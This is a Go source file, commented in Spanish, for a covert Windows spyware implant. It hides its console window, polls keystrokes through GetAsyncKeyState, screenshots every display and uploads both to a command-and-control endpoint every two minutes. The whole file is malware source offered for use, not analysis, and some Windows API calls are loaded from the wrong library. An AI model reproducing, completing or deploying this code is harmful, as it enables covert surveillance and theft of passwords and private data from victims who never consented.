package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"path/filepath"
	"runtime"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

// Declaraciones para usar la API de Windows para keylogger
var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

// Función para capturar la pantalla y enviarla al C2
func captureScreenshotAndSend() {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("Error capturando la pantalla:", err)
			continue
		}

		// Guardar la captura de pantalla en un buffer
		var imgBuffer bytes.Buffer
		png.Encode(&imgBuffer, img)

		// Enviar la captura al C2 usando multipart/form-data
		err = sendToC2("screenshot.png", imgBuffer.Bytes())
		if err != nil {
			fmt.Println("Error enviando captura al C2:", err)
		} else {
			fmt.Println("Captura enviada al C2.")
		}
	}
}

// Función para capturar las teclas presionadas
func captureKeystrokes() string {
	var result string
	for key := 0; key <= 256; key++ {
		state, _, _ := procGetAsyncKeyState.Call(uintptr(key))
		if state&0x8000 != 0 {
			result += fmt.Sprintf("%d ", key)
		}
	}
	return result
}

// Función para enviar los datos al C2 usando multipart/form-data
func sendToC2(filename string, data []byte) error {
	url := "http://localhost:9090/upload"

	// Crear un buffer para almacenar el cuerpo de la solicitud
	body := new(bytes.Buffer)

	// Crear un writer para multipart/form-data
	writer := multipart.NewWriter(body)

	// Crear la parte del archivo en la solicitud
	part, err := writer.CreateFormFile("file", filepath.Base(filename))
	if err != nil {
		return err
	}

	// Escribir los datos del archivo en la parte de multipart
	_, err = part.Write(data)
	if err != nil {
		return err
	}

	// Cerrar el writer para escribir el cierre de la solicitud multipart
	err = writer.Close()
	if err != nil {
		return err
	}

	// Crear la solicitud HTTP
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}

	// Establecer el encabezado Content-Type a multipart/form-data
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Enviar la solicitud
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Verificar la respuesta del servidor C2
	respBody, err := ioutil.ReadAll(resp.Body) // Lee el cuerpo de la respuesta
	if err != nil {
		return err
	}
	fmt.Println("Respuesta del C2:", string(respBody))

	return nil
}

// Función para ocultar la ventana en Windows
func hideWindow() {
	if runtime.GOOS == "windows" {
		var modkernel32 = syscall.NewLazyDLL("kernel32.dll")
		var procGetConsoleWindow = modkernel32.NewProc("GetConsoleWindow")
		var procShowWindow = modkernel32.NewProc("ShowWindow")
		hwnd, _, _ := procGetConsoleWindow.Call()
		procShowWindow.Call(hwnd, uintptr(0)) // Ocultar ventana
	}
}

func main() {
	// Ocultar la ventana si se ejecuta en Windows
	hideWindow()

	for {
		// Capturar pantalla y teclas cada 2 minutos
		go captureScreenshotAndSend()
		keystrokes := captureKeystrokes()
		if keystrokes != "" {
			go sendToC2("keystrokes.txt", []byte(keystrokes))
		}

		time.Sleep(2 * time.Minute)
	}
}
